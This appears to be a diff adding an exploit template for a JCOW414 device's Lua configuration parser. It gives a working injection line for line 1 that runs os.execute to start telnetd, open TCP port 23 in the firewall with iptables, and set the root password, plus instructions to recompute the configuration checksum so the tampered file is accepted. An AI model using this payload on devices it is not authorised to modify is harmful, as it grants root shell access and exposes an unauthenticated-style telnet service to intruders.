@@ -1,0 +1,32 @@
+# ==============================================================================
+# JCOW414 Configuration Injection Template
+# Structure Reference for Exploiting Lua Configuration Parser
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# LINE 1: Injected Lua Execution Payload
+# Replace the stock line 1 ("config.userdb = {}") with this payload:
+# ------------------------------------------------------------------------------
+config.userdb = {} os.execute("/usr/sbin/telnetd"); os.execute("/pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 23 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT"); os.execute("echo -e \"[YOUR_DESIRED_ROOT_PASSWORD]\n[YOUR_DESIRED_ROOT_PASSWORD]\" | passwd root");
+
+# ------------------------------------------------------------------------------
+# LINES 2 - 3011: Standard Stock Configuration Lines
+# (Kept identical to original decrypted configuration)
+# ------------------------------------------------------------------------------
+config.userdb["users"] = {}
+config.userdb["users"][1] = {}
+config.userdb["users"][1]["groupname"] = "guest"
+# ... [rest of stock config unchanged] ...
+
+# ------------------------------------------------------------------------------
+# LINE 3012: Checksum Declaration
+# Must be calculated using scripts/checksum_calculator.py across all bytes
+# from byte 0 up to immediately before the string 'config.checksum = "'
+# ------------------------------------------------------------------------------
+config.checksum = "[COMPUTED_32_CHAR_MD5_HASH]"
+
+# ------------------------------------------------------------------------------
+# LINES 3013 - END: Trailing Stock Configuration Lines
+# ------------------------------------------------------------------------------
+config.firewall = {}
+# ... [rest of stock config unchanged] ...
